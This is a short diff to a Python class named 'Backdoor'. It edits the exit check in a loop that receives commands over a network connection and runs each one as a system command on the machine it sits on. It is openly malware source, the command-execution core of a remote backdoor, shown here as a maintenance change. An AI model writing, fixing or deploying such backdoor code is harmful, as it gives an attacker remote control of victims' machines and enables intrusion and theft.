@@ -42,7 +42,7 @@ class Backdoor:
     def run(self):
         while True:
             command = self.reliable_receive()
-            if command[:4].lower() == 'exit':
+            if command.lower() == 'exit':
                 self.connection.close()
                 exit()
             command_result = self.execute_system_command(command)
